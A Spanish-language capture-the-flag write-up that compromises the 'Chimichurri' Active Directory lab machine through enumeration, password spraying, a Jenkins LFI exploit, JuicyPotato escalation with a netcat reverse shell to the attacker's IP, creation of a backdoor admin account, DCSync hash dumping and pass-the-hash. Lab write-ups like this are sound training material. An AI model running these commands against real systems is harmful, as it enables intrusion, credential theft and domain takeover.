---
layout: single
title: Chimichurri - The Hackers Labs
excerpt: "Chimichurri es una máquina Windows de Active Directory, donde encontramos un information leakage inicial en el SMB, luego aprovechamos un LFI para explotar Jenkins y obtener credenciales. Luego obtenemos acceso mediante evil-winrm. Para escalar privilegios, abusamos del privilegio SeImpersonatePrivilege, permitiendo la elevación a Admin del dominio. Además, aplicamos técnicas de enumeración específicas para Active Directory, lo que brinda una introducción práctica a técnicas de hacking y escalación de privilegios en entornos AD."
date: 2024-11-11
classes: wide
header:
  teaser: /assets/images/thl-writeup-chimichurri/chimichurri.jpg
  teaser_home_page: true
  icon: /assets/images/thl.png
categories:

- thehackerslabs
- OSCP
- Active Directory
- Fácil
- Windows
- eCPPTv3

tags:

- SMB Enumeration
- Information Leakage
- RPC Enumeration
- Ldap Enumeration
- AXFR - Domain Zone Transfer Attack
- Kerberos User Enumeration
- ASRepRoast Attack
- SMB Password Spray Attack
- Jenkins Exploitation
- Abusing WinRM
- Abusing SeImpersonatePrivilege - Juicy Potato
- DCSync Exploitation NTDS
- PassTheHash
---

Esta máquina es de la plataforma The Hackers Labs [visitar](https://thehackerslabs.com/)

Certificaciones a aplicar: OSCP, eCPPTv3

Dificultad: Fácil

Técnicas Vistas: 

- SMB Enumeration
- Information Leakage
- RPC Enumeration (rpcclient)(Failed) (EXTRA)
- Ldap Enumeration (ldapsearch)(Failed) (EXTRA)
- AXFR - Domain Zone Transfer Attack (Failed)(EXTRA)
- Kerberos User Enumeration (Kerbrute) (EXTRA)
- ASRepRoast Attack (GetNPUsers)(Failed) (EXTRA)
- SMB Password Spray Attack (Netexec) (EXTRA)
- Jenkins Exploitation (LFI)
- Abusing WinRM
- Abusing SeImpersonatePrivilege - Juicy Potato [Privilege Escalation]
- DCSync Exploitation NTDS (secretsdump, Netexec)
- PassTheHash (evil-winrm, wmiexec.py)

![chimichurri.jpg](/assets/images/thl-writeup-chimichurri/chimichurri.jpg)

# IP de la Maquina

192.168.179.144

# Reconocimiento

En este caso como la maquina esta desplegada en VMware, en nuestra red local, para saber la ip empleamos la herramienta arp-scan como super usuario.

```bash
arp-scan -l
```

![Ip.png](/assets/images/thl-writeup-chimichurri/Ip.png)

En este caso esta es la ip asignada a la maquina.

Comprobando conectividad con la maquina

```bash
ping -c1 192.168.179.144
```

![ping.png](/assets/images/thl-writeup-chimichurri/ping.png)

Identificando el sistema operativo

Empleamos un script hecho en python que en base al TTL nos dice ante que sistema operativo nos encontramos. El script fue hecho por [s4vitar](https://x.com/s4vitar), si quieren tenerlo se los dejo por aquí [Descargar Script](https://pastebin.com/HmBcu7j2)

```bash
wichSystem.py 192.168.179.144
```

![whichSystem.png](/assets/images/thl-writeup-chimichurri/whichSystem.png)

# Enumeración

Escaneo de los puertos 

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.179.141 -oG scanP

# sudo Privilegios de administrador
# -p- Para que escanee todo el rango de puertos disponible (65,535)
# --open Solo muestre los puertos abiertos (no filtrados ni cerrados)
# -sS Aplicamos un tcp Syn port Scan (agilizar el escaneo)
# --min-rate 5000 Agilizar escaneo
# -vvv Nos reporte por consola a medida nos vaya descubriendo cosas
# -n Para que no aplique resolucion DNS (ralentiza el escaneo)
# -Pn (el favorito de todos XD) Para que no aplique descubrimiento de hosts (host discovery)
# -oG Para guardar en formato Grep
```

![scanP.png](/assets/images/thl-writeup-chimichurri/scanP.png)

Empleamos una utilidad llamada extractPorts, que nos permite sacar la información mas relevante de la captura Grep de nmap y copiar los puertos directamente a la clipboard, por eso guardamos en ese formato, para poder aprovechar esta utilidad y agilizar nuestro trabajo. Fue hecho por [s4vitar](https://x.com/s4vitar), si quieren tenerla se las dejo por aquí [Descargar Script](https://pastebin.com/tYpwpauW), Para usarla la deben incorporar en su .zshrc o .bashrc y instalar xclip.

```bash
# Instalar xclip
apt install xclip

# Usando la herramienta
extractPorts scanP 
```

![extractPorts.png](/assets/images/thl-writeup-chimichurri/extractPorts.png)

Buscando vulnerabilidades en los servicios encontrados

```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,6969,9389,47001,49664,49665,49666,49668,49672,49673,49675,49681,49704,49739 192.168.179.144 -oN scanS

# -sCV Lanzamos scripts básicos de reconocimiento y detectamos versiones para esos servicios
# -p Indicamos los puertos
# -oN Guardamos en formato nmap o formato normal (tal como se muestra por consola) 
```

![scanS.png](/assets/images/thl-writeup-chimichurri/scanS.png)

Como observamos tenemos muchos servicios porque estamos ante un directorio activo, en el cual hay bastantes servicios corriendo en la maquina victima, vamos a ir paso a paso enumerando servicio por servicio. 

Importante como observamos en el escaneo nos muestra un dominio el cual para muchos de los ataques es indispensable que lo agreguemos al /etc/hosts.

![dominio.png](/assets/images/thl-writeup-chimichurri/dominio.png)

Lo primero que haremos ya que tenemos el puerto 445 (SMB) abierto, que es el servicio para compartir recursos mediante la red, sera identificar ante que nos enfrentamos, para esto usaremos NetExec.

```bash
nxc smb 192.168.179.144
```

![nxc smb.png](/assets/images/thl-writeup-chimichurri/nxc_smb.png)

Vemos que estamos ante un windows server 2016 y también nos muestra el dominio que previamente identificamos con Nmap.

Ahora miraremos si hay algún recurso compartido al cual podemos acceder sin proporcionar contraseña. empleando null session o con usuarios comunes como default, guest, invitado, etc.

```bash
nxc smb 192.168.179.144 -u 'guest' -p '' --shares
```

![nxc shares.png](/assets/images/thl-writeup-chimichurri/nxc_shares.png)

Vemos que tenemos un recurso bastante inusual llamado drogas en el cual tenemos permisos de lectura, aquí tenemos varias herramientas para utilizar y llegar a enumerar el contenido, podemos hacerlo con NetExec, SmbMap o SmbClient. En nuestro caso usaremos SmbClient ya que resulta bastante cómoda para estas tareas pero siempre nos apoyamos de las otras ya que en SmbClient no nos muestra que tipo de permisos poseemos sobre un recurso.

```bash
# Conectarnos al recurso
smbclient //192.168.179.144/drogas -N

#Listamos el contenido
dir

#Descargar el archivo
get {file}
```

![smbclient.png](/assets/images/thl-writeup-chimichurri/smbclient.png)

Nos conectamos con éxito y vemos un txt dentro. Ahora nos vamos a descargar ese archivo para ver que contiene.

![getfile.png](/assets/images/thl-writeup-chimichurri/getfile.png)

Lo descargamos en el directorio que ejecutamos SmbClient.

Vemos que el archivo nos da 2 cosas.

![credenciales.png](/assets/images/thl-writeup-chimichurri/credenciales.png)

Una de ellas es un usuario y una pista de donde esta su contraseña.

Continuamos enumerando, Como mencione antes, enumeraremos como normalmente se haría en AD, para ver un poco las herramientas y servicios que suelen contener información importante que nos puede ser de utilidad, aunque en esta maquina no la encontremos, nos servirá mucho para otras que realicemos.

Enumerando RPC, usamos rpcclient para enumerar usuarios del dominio, grupos del dominio, descripciones de los usuarios o grupos etc.

```bash
#Null Session
rpcclient -U "" 192.168.179.144 -N

#Si disponemos de credenciales
rpcclient -U "user%pass" {IP_Victim} 

```

![rpcclient.png](/assets/images/thl-writeup-chimichurri/rpcclient.png)

Nos conectamos con éxito ahora los comandos que suelen utilizarse son los siguientes:

```bash
#Para ver info de usuarios del dominio
enumdomusers

#Para ver grupos del dominio
enumdomgroups

#Ver usuarios admin del dominio suelen tener el rid 0x200, todos los rid que reporte seran usuarios miembros de este grupo
querygroupmem 0x200

#Para ver un usuario en base al rid
queryuser rid

#Para ver las descripciones de los usuarios
querydispinfo
```

![enumdomusers.png](/assets/images/thl-writeup-chimichurri/enumdomusers.png)

Vemos que no tenemos éxito, quiere decir que no permite null session y no podremos enumerar nada.

Enumeramos LDAP para ver información que también nos pueda ser útil, a veces encontramos usuarios entre otras cosas.

```bash
#Enumeramos los naming contexts
ldapsearch -x -H ldap://192.168.179.144 -s 'base' namingcontext
```

![ldapsearch nc.png](/assets/images/thl-writeup-chimichurri/ldapsearch_nc.png)

Tomamos el primer valor de los naming contexts

```bash
#Tomamos el primer resultado de namingcontexts
ldapsearch -x -H ldap://192.168.179.144 -b 'DC=chimichurri,DC=thl'
```

![ldapsearch b.png](/assets/images/thl-writeup-chimichurri/ldapsearch_b.png)

No encontramos nada, recordemos esto lo hacemos solo para ver lo que normalmente se enumera en un DC.

Podemos probar también a lanzar una solicitud dns para ver si logramos hacer un ataque que se conoce como domain zone transfer.

```bash
#Lanzar solicitud dns al dominio

dig @192.168.179.144 chimichurri.thl
```

![dig solicitud dns.png](/assets/images/thl-writeup-chimichurri/dig_solicitud_dns.png)

Ver nombres de dominio 

```bash
#Enumerar nombres de dominio
dig @192.168.179.144 chimichurri.thl ns
```

![dig ns.png](/assets/images/thl-writeup-chimichurri/dig_ns.png)

Ver servidores de correo 

```bash
#Enumerar servidores de correo

dig @192.168.179.144 chimichurri.thl mx
```

![dig mx.png](/assets/images/thl-writeup-chimichurri/dig_mx.png)

Ataque Domain Zone Transfer

```bash
#Ataque domain zone transfer sirve para ver todos los subdomninios en caso de que existan, para agregarlos al /etc/hosts en caso de que se aplique virtualhosting y así ahorrar la fuerza bruta

dig @192.168.179.144 chimichurri.thl axfr
```

![dig dzt.png](/assets/images/thl-writeup-chimichurri/dig_dzt.png)

En este caso no encontramos nada.

Podemos ir directamente a la maquina pero vamos a enumerar posibles usuarios a nivel de dominio. Hay usuarios que suelen ser comunes en estos entornos, podemos probar creando una pequeña lista y validarlos con kerbrute y ucon impacket-GetNPUsers.

Enumerando usuarios y aparte probara por defecto el ASREPRoast que es un ataque que explota a los usuarios que carecen del atributo requerido de pre-autenticación de Kerberos.

Primero creamos este pequeño diccionario.

![dic.png](/assets/images/thl-writeup-chimichurri/dic.png)

Kerbrute

```bash
kerbrute userenum -d chimichurri.thl --dc 192.168.179.144 users.txt
```

![kerbrute.png](/assets/images/thl-writeup-chimichurri/kerbrute.png)

Vemos que nos a encontrado 3 usuarios validos a nivel de dominio, del cual ya conocíamos uno. Pero ninguno tiene el atributo requerido de pre-autenticación de Kerberos, ya que si un usuario lo tuviera nos mostraría un hash el cual podemos tratar de crackear de manera offline.

impacket-GetNPUsers

```bash
impacket-GetNPUsers -no-pass -usersfile users.txt chimichurri.thl/
```

![Get-NPUsers.png](/assets/images/thl-writeup-chimichurri/Get-NPUsers.png)

De esta manera también podemos validar los usuarios que existen, ya que como observamos en la imagen para aquellos usuarios que no son validos el mensaje cambia, en los que son validos el mensaje es doesn't have UF_DONT_REQUIRE_PREAUTH set. 

Seguimos con la maquina? pues todavía no, ahora mostrare otra técnica llamada password spraying, ahora que tenemos 3 usuarios validos borramos los demás y nos quedamos únicamente con estos para realizar la prueba. Crearemos un diccionario sencillo solo para mostrar como se hace.

![usersdc.png](/assets/images/thl-writeup-chimichurri/usersdc.png)

```bash
#--continue-on-success es para que siga probando aunque nos encuentre una credencial valida, ya que si no le indicamos este parametro, cuando encuentre la primera se va a detener.
nxc smb 192.168.179.144 -u users.txt -p dic.txt --continue-on-success
```

![passwordspraying.png](/assets/images/thl-writeup-chimichurri/passwordspraying.png)

Vemos que de esta forma detectamos 2 credenciales para 2 usuarios. Lo dejaremos por aquí de momento y ahora sigamos con la maquina. Espero estas técnicas les sirvan para futuras maquinas en hacking de AD.

Ahora si continuemos con la maquina. Repasando un poco, ya que analizamos varios servicios donde en algunos sacamos alguna información interesante no encontramos mas, así que revisemos el escaneo de nmap de nuevo.

![catscanS.png](/assets/images/thl-writeup-chimichurri/catscanS.png)

Vemos que hay Jenkins corriendo en ese puerto, vamos a ver que nos muestra.

![jenkins.png](/assets/images/thl-writeup-chimichurri/jenkins.png)

En efecto tenemos un jenkins, revisando un poco, tenemos un login para el cual tampoco tenemos credenciales, revisando un poco mas y si tenemos buen ojo lograremos enumerar algo interesante.

Utilizando whatweb también podemos ver eso interesante.

![whatweb.png](/assets/images/thl-writeup-chimichurri/whatweb.png)

Obtenemos la version de jenkins y como no poseemos credenciales, podemos buscar algún exploit para esa version o una version un poco mas arriba.

# Explotación

```bash
searchsploit Jenkins 2.
```

![searchsploit.png](/assets/images/thl-writeup-chimichurri/searchsploit.png)

Encontramos un exploit para la version 2.441 que contempla un LFI, vamos a probarlo. Nos copiamos el exploit.

```bash
searchsploit -m java/webapps/51993.py
```

![searchsploit-m.png](/assets/images/thl-writeup-chimichurri/searchsploit-m.png)

Ahora lo renombrare y lo probaremos para ver que nos solicita.

```bash
python jexploit.py
```

![jpexploit.png](/assets/images/thl-writeup-chimichurri/jpexploit.png)

Vemos que nos pide la url y una ruta. Esto nos devuelve al archivo que encontramos en el smb el cual nos decía que el usuario hacker tienes sus credenciales como perico en el escritorio. Recordemos como suelen estar ubicadas las carpetas de los usuarios en sistemas windows.

```bash
python jexploit.py -u http://192.168.179.144:6969/ -p /Users/hacker/Desktop/perico.txt > creds.txt
```

De esta manera redirigimos la salida del comando para que la guarde en un archivo llamado creds.txt

![creds.png](/assets/images/thl-writeup-chimichurri/creds.png)

Vemos que tenemos el archivo, si lo revisamos encontraremos las credenciales para el usuario hacker.

![hackercreds.png](/assets/images/thl-writeup-chimichurri/hackercreds.png)

Ahora vamos a comprobar si esas credenciales son validas con NetExec. Si nos coloca Pwn3d! significa que este usuario posee privilegios altos y podríamos usar Psexec para conectarnos, de lo contrario si coloca un + significa que solo son validas, si coloca un - no son validas. También comprobaremos con el servicio de administración remota de windows (winrm), si aquí nos coloca Pwn3d! nos podremos conectar con Evil-Winrm.

```bash
nxc smb 192.168.179.144 -u 'hacker' -p 'pass'
```

![nxc creds.png](/assets/images/thl-writeup-chimichurri/nxc_creds.png)

Solo nos coloca + significa que son validas pero no podemos usar psexec para conectarnos.

Ahora comprobamos con el servicio winrm

```bash
nxc winrm 192.168.179.144 -u 'hacker' -p 'pass'
```

![nxc winrm.png](/assets/images/thl-writeup-chimichurri/nxc_winrm.png)

Como observamos nos coloca Pwn3d!, entonces nos podemos conectar con Evil-Winrm.

Evil-Winrm

```bash
evil-winrm -u 'hacker' -p 'pass' -i 192.168.179.144
```

![evil-winrm.png](/assets/images/thl-writeup-chimichurri/evil-winrm.png)

Estamos dentro de la maquina como el usuario hacker, ahora nos queda buscar una manera de elevar privilegios y convertirnos en el usuario Administrador del Dominio.

# Escalada de Privilegios (Post Explotación)

Como siguiente paso el objetivo es convertirnos en usuarios administradores del dominio, para eso realizaremos las siguientes acciones

```bash
#Ver info general de un usuario
net user usuario

#Ver los grupos
net group o net localgroup

#ver los privilegios que posee ese usuario
whoami /priv

#Ver toda la info del usuario
whoami /all

#Ver si el usuario pertenece a ese grupo de manera local o a nivel de dominio
net localgroup "grupo" o net group "grupo"

```

Info general del usuario

![netuser.png](/assets/images/thl-writeup-chimichurri/netuser.png)

Grupos

![netgroup.png](/assets/images/thl-writeup-chimichurri/netgroup.png)

La información que obtengamos de aquí nos va a ser muy útil para saber por donde vamos a escalar privilegios, no siempre va a ser así, en otros casos nos tocara recurrir a otras herramientas para enumerar de una mejor manera.

![whoami-priv.png](/assets/images/thl-writeup-chimichurri/whoami-priv.png)

Al observar los privilegios vemos que hay uno interesante, vamos a ver como podemos aprovecharnos de este y escalar privilegios.

Podemos usar dos herramientas JuicyPotato o PetitPotato. En este caso usaremos la primera.

Lo primero sera descargar la herramienta desde aquí [JuicyPotato](https://github.com/ohpe/juicy-potato/releases) luego la transferimos a la maquina victima. Primero nos crearemos un folder en tmp, para organizar mejor nuestro trabajo, luego aquí subiremos lo que necesitemos.

![Privesc.png](/assets/images/thl-writeup-chimichurri/Privesc.png)

Ya tenemos creado el folder al cual llamamos Privesc.

Transferimos el JuicyPotato a la maquina victima. Renombramos el ejecutable a Jp.exe para mas comodidad.

![mvJp.png](/assets/images/thl-writeup-chimichurri/mvJp.png)

![transferJp.png](/assets/images/thl-writeup-chimichurri/transferJp.png)

Ya lo tenemos. Continuamos, vamos a hacer 2 cosas pasar un netcat y obtener una reverseshell y luego crear un usuario y agregarlo al grupo de administradores. En este caso haremos las 2, para que vean como se hace. Buscamos el nc.exe en nuestro sistema o lo descargamos, una ves hecho eso lo trasnferimos.

![nc.png](/assets/images/thl-writeup-chimichurri/nc.png)

Ya con esto probamos lo siguiente, nos ponemos en escucha en nuestro equipo y ejecutamos el JuicyPotato de la siguiente manera, (Depende el SO ante el que estemos, si da algun error deberemos buscar el CLSID adecuado en el mismo repo [CLISD](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) buscar la version y seleccionar uno que ejecute NT Authority System). En este caso funciona con el que lanza por defecto.

```bash
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd 192.168.179.139 4444"
```

Observamos que obtenemos la conexion sin problemas como NT Authority Systerm

![ntAuth.png](/assets/images/thl-writeup-chimichurri/ntAuth.png)

Solo que si tratamos de ver las flags no nos deja ya que debemos ser Usuario admin del dominio para poder verlas.  ya siendo NT Authority System podemos realizar los pasos de abajo sin usar JuicyPotato.

Creación del usuario y agregarlo al grupo administradores.

```bash
#Creacion del usuario
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user ewor01 pass123! /add"

#Agregar al grupo Administradores
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administradores ewor01 /add"

#Para que en crackmapexec por smb nos ponga pwned y poder hacer de todo con ese usuario, hay que retocar el siguiente registro
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"

```

![useradd.png](/assets/images/thl-writeup-chimichurri/useradd.png)

Al ejecutar los primeros 2 y verificar con netexec vemos que nos pone un +, si queremos que nos coloque Pwn3d! debemos retocar un registro para el cual es el tercer comando y tener capacidad de conectarnos como usuario privilegiado con el usuario que acabamos de agregar.

Usuario agregado con privilegios.

![userpriv.png](/assets/images/thl-writeup-chimichurri/userpriv.png)

Podremos conectarnos como el usuario que hemos agregado, con evilwin-rm pero no podríamos ver las flag debido a que debemos ser usuarios administradores del dominio, para eso Vamos a realizar un dumping de los hashes de los usuarios con netexec o con secrests-dump mediante NTDS (NTDS, o NT Directory Services, es el archivo de base de datos de Microsoft Active Directory) empleando un Dcsync attack. 

```bash
#secretsdump, Nos va a solicitar la contrasenia del usuario la colocamos y listo.
impacket-secretsdump chimichurri.thl/ewor01@192.168.179.144

#Netexec 
nxc smb 192.168.179.144 -u 'ewor01' -p 'pass123!' --ntds
```

![secrets-dump.png](/assets/images/thl-writeup-chimichurri/secrets-dump.png)

![ntds.png](/assets/images/thl-writeup-chimichurri/ntds.png)

El hash que nos interesa es el del usuario administrador, no necesitamos conocer su contraseña ya que realizaremos una técnica llamada pass the hash para conectarnos a la maquina mediante evilwin-rm. 

Primero comprobamos el hash del usuario Administrador.

```bash
nxc winrm 192.168.179.144 -u 'Administrador' -H 'hash'
```

![domainAdmin.png](/assets/images/thl-writeup-chimichurri/domainAdmin.png)

 Ahora solo nos queda conectarnos con evil-winrm, psexec o wmiexec para emplear Pass the hash. Al usar psexec sucede algo, siempre ingresa como NT Authority System y no como Admin del dominio, con wmiexec si funciona correctamente.

```bash
evil-winrm -i 192.168.179.144 -u 'Administrador' -H 'hash'
```

Una vez obtenemos acceso podemos visualizar las flags y dar por terminada la maquina.

![adminuser.png](/assets/images/thl-writeup-chimichurri/adminuser.png)

![pwned.png](/assets/images/thl-writeup-chimichurri/pwned.png)

wmiexec

```bash
impacket-wmiexec chimichurri.thl/Administrador@192.168.179.144 -shell-type powershell -hashes :hash
```

![wmiexec.png](/assets/images/thl-writeup-chimichurri/wmiexec.png)

De esta forma tenemos 2 opciones para ingresar a la maquina, también con el usuario que creamos podíamos solo cambiar el pass del usuario administrador para ganar acceso a la maquina. 

¡Gracias por leer hasta aquí! Espero que este writeup te haya sido útil para comprender mejor los pasos para enumerar un AD y para resolver esta máquina.  ¡Nos vemos en el próximo reto, y sigue hackeando con ética!
